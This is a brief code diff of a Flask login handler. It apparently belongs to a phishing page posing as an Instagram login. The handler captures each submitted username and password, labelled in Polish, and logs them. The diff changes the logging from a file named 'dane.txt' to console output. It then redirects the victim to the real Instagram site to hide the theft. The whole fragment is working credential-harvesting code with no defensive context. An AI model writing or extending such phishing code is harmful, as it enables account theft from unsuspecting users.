@@ -22,8 +22,7 @@ def login():
     if request.method == 'POST':
         user = request.form['username']
         pwd = request.form['password']
-        with open('dane.txt', 'a') as f:
-            f.write(f'Login: {user}, Hasło: {pwd}\n')
+        print(f'Login: {user}, Hasło: {pwd}')
         return redirect('https://www.instagram.com')
     return render_template_string(html)
 
